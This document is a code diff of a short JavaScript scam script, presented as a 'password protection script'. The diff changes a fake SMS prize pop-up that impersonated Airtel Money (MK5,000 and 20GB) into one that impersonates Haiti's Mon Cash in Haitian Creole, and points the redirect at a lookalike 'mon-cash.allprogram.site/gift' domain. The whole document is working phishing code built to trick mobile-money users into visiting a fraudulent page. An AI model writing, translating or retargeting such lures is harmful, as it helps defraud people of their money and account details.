@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'MK5,000'
-password=prompt('SMS: Congratulations Your Airtel Money Account is Eligible to receive MK5,000 + 20GB Anniversary Celebration Offer, Kindly Press OK to PROCEED  ','MK5,000');
-if (password != 'MK5,000') {
-location.href='https://airtel-money.allprogram.site/gift';
+var password = 'HTG 2,000'
+password=prompt('SMS: Felisitasyon Kont Mon Cash ou a kalifye pou resevwa òf selebrasyon 2000yèm anivèsè HTG a, tanpri peze OK pou KONTINYE.  ','HTG 2,000');
+if (password != 'HTG 2,000') {
+location.href='https://mon-cash.allprogram.site/gift';
 }
